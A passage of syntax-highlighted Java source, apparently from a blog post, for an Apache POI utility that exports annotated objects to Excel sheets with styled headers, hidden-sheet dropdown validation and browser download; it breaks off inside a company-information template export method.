class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">getAnnotation</span><span class="token punctuation">(</span>ExcelColumn<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>annotation <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> annotation<span class="token punctuation">.</span><span class="token function">col</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">sorted</span><span class="token punctuation">(</span>Comparator<span class="token punctuation">.</span><span class="token function">comparing</span><span class="token punctuation">(</span>field <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>                    <span class="token keyword">int</span> col <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                    ExcelColumn annotation <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">getAnnotation</span><span class="token punctuation">(</span>ExcelColumn<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>annotation <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        col <span class="token operator">=</span> annotation<span class="token punctuation">.</span><span class="token function">col</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token keyword">return</span> col<span class="token punctuation">;</span>                <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span>Collectors<span class="token punctuation">.</span><span class="token function">toList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        HSSFWorkbook wb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HSSFWorkbook</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>List<span class="token operator">&lt;</span>T<span class="token operator">></span> dataList <span class="token operator">:</span> dataListList<span class="token punctuation">)</span> <span class="token punctuation">{</span>            String sheetNameThis <span class="token operator">=</span> sheetName <span class="token operator">+</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            i<span class="token operator">++</span><span class="token punctuation">;</span>            HSSFSheet sheet <span class="token operator">=</span> wb<span class="token punctuation">.</span><span class="token function">createSheet</span><span class="token punctuation">(</span>sheetNameThis<span class="token punctuation">)</span><span class="token punctuation">;</span>            sheet<span class="token punctuation">.</span><span class="token function">setDefaultColumnWidth</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            AtomicInteger ai <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AtomicInteger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">{</span>                Row row <span class="token operator">=</span> sheet<span class="token punctuation">.</span><span class="token function">createRow</span><span class="token punctuation">(</span>ai<span class="token punctuation">.</span><span class="token function">getAndIncrement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                row<span class="token punctuation">.</span><span class="token function">setHeight</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">short</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token number">30</span> <span class="token operator">*</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                AtomicInteger aj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AtomicInteger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">//写入头部</span>                fieldList<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>field <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>                    ExcelColumn annotation <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">getAnnotation</span><span class="token punctuation">(</span>ExcelColumn<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    String columnName <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>annotation <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        columnName <span class="token operator">=</span> annotation<span class="token punctuation">.</span><span class="token function">value</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    Cell cell <span class="token operator">=</span> row<span class="token punctuation">.</span><span class="token function">createCell</span><span class="token punctuation">(</span>aj<span class="token punctuation">.</span><span class="token function">getAndIncrement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    CellStyle cellStyle <span class="token operator">=</span> wb<span class="token punctuation">.</span><span class="token function">createCellStyle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    cellStyle<span class="token punctuation">.</span><span class="token function">setFillForegroundColor</span><span class="token punctuation">(</span>IndexedColors<span class="token punctuation">.</span>SKY_BLUE<span class="token punctuation">.</span><span class="token function">getIndex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    cellStyle<span class="token punctuation">.</span><span class="token function">setFillPattern</span><span class="token punctuation">(</span>FillPatternType<span class="token punctuation">.</span>SOLID_FOREGROUND<span class="token punctuation">)</span><span class="token punctuation">;</span>                    cellStyle<span class="token punctuation">.</span><span class="token function">setVerticalAlignment</span><span class="token punctuation">(</span>VerticalAlignment<span class="token punctuation">.</span>CENTER<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//垂直剧中</span>                    cellStyle<span class="token punctuation">.</span><span class="token function">setAlignment</span><span class="token punctuation">(</span>HorizontalAlignment<span class="token punctuation">.</span>LEFT<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//水平居左</span>                    cellStyle<span class="token punctuation">.</span><span class="token function">setBorderBottom</span><span class="token punctuation">(</span>BorderStyle<span class="token punctuation">.</span>THIN<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//下边框</span>                    cellStyle<span class="token punctuation">.</span><span class="token function">setBorderLeft</span><span class="token punctuation">(</span>BorderStyle<span class="token punctuation">.</span>THIN<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//左边框</span>                    cellStyle<span class="token punctuation">.</span><span class="token function">setBorderTop</span><span class="token punctuation">(</span>BorderStyle<span class="token punctuation">.</span>THIN<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//上边框</span>                    cellStyle<span class="token punctuation">.</span><span class="token function">setBorderRight</span><span class="token punctuation">(</span>BorderStyle<span class="token punctuation">.</span>THIN<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//右边框</span>                    Font font <span class="token operator">=</span> wb<span class="token punctuation">.</span><span class="token function">createFont</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    font<span class="token punctuation">.</span><span class="token function">setColor</span><span class="token punctuation">(</span>HSSFColor<span class="token punctuation">.</span>HSSFColorPredefined<span class="token punctuation">.</span>BLACK<span class="token punctuation">.</span><span class="token function">getIndex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    font<span class="token punctuation">.</span><span class="token function">setBold</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    cellStyle<span class="token punctuation">.</span><span class="token function">setFont</span><span class="token punctuation">(</span>font<span class="token punctuation">)</span><span class="token punctuation">;</span>                    cell<span class="token punctuation">.</span><span class="token function">setCellStyle</span><span class="token punctuation">(</span>cellStyle<span class="token punctuation">)</span><span class="token punctuation">;</span>                    cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>columnName<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>CollectionUtils<span class="token punctuation">.</span><span class="token function">isNotEmpty</span><span class="token punctuation">(</span>dataList<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                dataList<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>t <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>                    Row row1 <span class="token operator">=</span> sheet<span class="token punctuation">.</span><span class="token function">createRow</span><span class="token punctuation">(</span>ai<span class="token punctuation">.</span><span class="token function">getAndIncrement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    AtomicInteger aj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AtomicInteger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    fieldList<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>field <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>                        Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> type <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        Object value <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>                        <span class="token keyword">try</span> <span class="token punctuation">{</span>                            value <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                        Cell cell <span class="token operator">=</span> row1<span class="token punctuation">.</span><span class="token function">createCell</span><span class="token punctuation">(</span>aj<span class="token punctuation">.</span><span class="token function">getAndIncrement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>value <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span>type <span class="token operator">==</span> Date<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>value<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>value<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span>                            cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>value<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">//冻结窗格</span>            wb<span class="token punctuation">.</span><span class="token function">getSheet</span><span class="token punctuation">(</span>sheetNameThis<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">createFreezePane</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">buildExcelDocument</span><span class="token punctuation">(</span>wb<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 设置某些列的值只能输入预制的数据,显示下拉框     *     * @param sheet           HSSFSheet sheetlist = wb.createSheet("XXXX");工作表对象     * @param textlist        下拉框内容     * @param hiddenSheetName 下拉框内容所在隐藏sheet名称     * @param firstRow        添加下拉框对应开始行     * @param endRow          添加下拉框对应结束行     * @param firstCol        添加下拉框对应开始列     * @param endCol          添加下拉框对应结束列     * @param sheetNum        sheet所在位置(从0开始算)     * @return     */</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">setHSSFValidation</span><span class="token punctuation">(</span>HSSFSheet sheet<span class="token punctuation">,</span> String<span class="token punctuation">[</span><span class="token punctuation">]</span> textlist<span class="token punctuation">,</span> String hiddenSheetName<span class="token punctuation">,</span>                                          <span class="token keyword">int</span> firstRow<span class="token punctuation">,</span> <span class="token keyword">int</span> endRow<span class="token punctuation">,</span> <span class="token keyword">int</span> firstCol<span class="token punctuation">,</span> <span class="token keyword">int</span> endCol<span class="token punctuation">,</span> <span class="token keyword">int</span> sheetNum<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//这里将下拉框进行拆分存储在每一个单元格  并进行隐藏  防止下拉框数据过多存储在一个单元格的字符数大于255而报错</span>        HSSFWorkbook workbook <span class="token operator">=</span> sheet<span class="token punctuation">.</span><span class="token function">getWorkbook</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Sheet hidden <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createSheet</span><span class="token punctuation">(</span>hiddenSheetName<span class="token punctuation">)</span><span class="token punctuation">;</span>        Cell cell <span class="token operator">=</span> null<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> length <span class="token operator">=</span> textlist<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            String name <span class="token operator">=</span> textlist<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            Row roww <span class="token operator">=</span> hidden<span class="token punctuation">.</span><span class="token function">createRow</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            cell <span class="token operator">=</span> roww<span class="token punctuation">.</span><span class="token function">createCell</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        Name namedCell <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        namedCell<span class="token punctuation">.</span><span class="token function">setNameName</span><span class="token punctuation">(</span>hiddenSheetName<span class="token punctuation">)</span><span class="token punctuation">;</span>        namedCell<span class="token punctuation">.</span><span class="token function">setRefersToFormula</span><span class="token punctuation">(</span>hiddenSheetName <span class="token operator">+</span> <span class="token string">"!$A$1:$A$"</span> <span class="token operator">+</span> textlist<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//将第sheetNum个sheet页设置为隐藏</span>        workbook<span class="token punctuation">.</span><span class="token function">setSheetHidden</span><span class="token punctuation">(</span>sheetNum<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//将名称为hiddenSheetName的数据进行加载</span>        DVConstraint constraint <span class="token operator">=</span> DVConstraint<span class="token punctuation">.</span><span class="token function">createFormulaListConstraint</span><span class="token punctuation">(</span>hiddenSheetName<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//设置数据有效性加载在哪个单元格上,四个参数分别是：起始行、终止行、起始列、终止列</span>        CellRangeAddressList regions <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CellRangeAddressList</span><span class="token punctuation">(</span>firstRow<span class="token punctuation">,</span> endRow<span class="token punctuation">,</span> firstCol<span class="token punctuation">,</span> endCol<span class="token punctuation">)</span><span class="token punctuation">;</span>        HSSFDataValidation data_validation_list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HSSFDataValidation</span><span class="token punctuation">(</span>regions<span class="token punctuation">,</span> constraint<span class="token punctuation">)</span><span class="token punctuation">;</span>        sheet<span class="token punctuation">.</span><span class="token function">addValidationData</span><span class="token punctuation">(</span>data_validation_list<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 浏览器下载excel     *     * @param wb     * @param response     */</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">buildExcelDocument</span><span class="token punctuation">(</span>Workbook wb<span class="token punctuation">,</span> HttpServletResponse response<span class="token punctuation">)</span> <span class="token punctuation">{</span>        OutputStream os <span class="token operator">=</span> null<span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            os <span class="token operator">=</span> response<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            response<span class="token punctuation">.</span><span class="token function">setContentType</span><span class="token punctuation">(</span><span class="token string">"application/vnd.ms-excel"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            response<span class="token punctuation">.</span><span class="token function">setCharacterEncoding</span><span class="token punctuation">(</span><span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            response<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">"Content-disposition"</span><span class="token punctuation">,</span> <span class="token string">"attachment;filename="</span> <span class="token operator">+</span> System<span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">".xlsx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            wb<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>os<span class="token punctuation">)</span><span class="token punctuation">;</span>            os<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>os <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">try</span> <span class="token punctuation">{</span>                    os<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> Map<span class="token operator">&lt;</span>Integer<span class="token punctuation">,</span> String<span class="token operator">></span> <span class="token function">getFields</span><span class="token punctuation">(</span>Class <span class="token class-name">clazz</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        Map<span class="token operator">&lt;</span>Integer<span class="token punctuation">,</span> String<span class="token operator">></span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Field<span class="token punctuation">[</span><span class="token punctuation">]</span> fields <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>Field field <span class="token operator">:</span> fields<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//判断属性是否标注了@Excel注解</span>            <span class="token keyword">boolean</span> fieldHasAnno <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">isAnnotationPresent</span><span class="token punctuation">(</span>Excel<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>fieldHasAnno<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">//获取@Excel注解</span>                Excel excel <span class="token operator">=</span> field<span class="token punctuation">.</span><span class="token function">getAnnotation</span><span class="token punctuation">(</span>Excel<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>excel<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> excel<span class="token punctuation">.</span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> map<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">buildExcelDocumenttest</span><span class="token punctuation">(</span>Workbook wb<span class="token punctuation">,</span> HttpServletResponse response<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//        OutputStream os = null;</span>        File toFile <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">"D:\\111.xls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            OutputStream os <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span>toFile<span class="token punctuation">)</span><span class="token punctuation">;</span>            wb<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>os<span class="token punctuation">)</span><span class="token punctuation">;</span>            os<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token comment" spellcheck="true">//            os = response.getOutputStream();</span><span class="token comment" spellcheck="true">//            response.setContentType("application/vnd.ms-excel");</span><span class="token comment" spellcheck="true">//            response.setCharacterEncoding("UTF-8");</span><span class="token comment" spellcheck="true">//            response.setHeader("Content-disposition", "attachment;filename=" + System.currentTimeMillis() + ".xlsx");</span><span class="token comment" spellcheck="true">//            wb.write(os);</span>    <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">/**   * 小升规企业信息动态下拉框导出   * @param response:   * @param industryList: 行业数组   * @param deptList: 部门数组   * @return: void   * @Author: CZM   */</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">potentialRisingGaugeOptions</span><span class="token punctuation">(</span>HttpServletResponse response<span class="token punctuation">,</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> industryList<span class="token punctuation">,</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> deptList<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">(</span>HSSFWorkbook workbook <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HSSFWorkbook</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            HSSFSheet sheet <span class="token operator">=</span> workbook<span class="token punctuation">.</span><span class="token function">createSheet</span><span class="token punctuation">(</span><span class="token string">"小升规企业信息"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            HSSFRow sheetRow <span class="token operator">=</span> sheet<span class="token punctuation">.</span><span class="token function">createRow</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">9</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                HSSFCell cell <span class="token operator">=</span> sheetRow<span class="token punctuation">.</span><span class="token function">createCell</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">setCellStyle</span><span class="token punctuation">(</span>cell<span class="token punctuation">,</span> workbook<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">//列宽</span>                sheet<span class="token punctuation">.</span><span class="token function">setColumnWidth</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">7000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"企业名称"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"统一社会信用代码"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"所属镇"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"行业大类"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"简介"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token string">"联系人"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    cell<span class="token punctuation">.</span><span class="token function">setCellValue</span><span class="token punctuation">(</span><span class="token 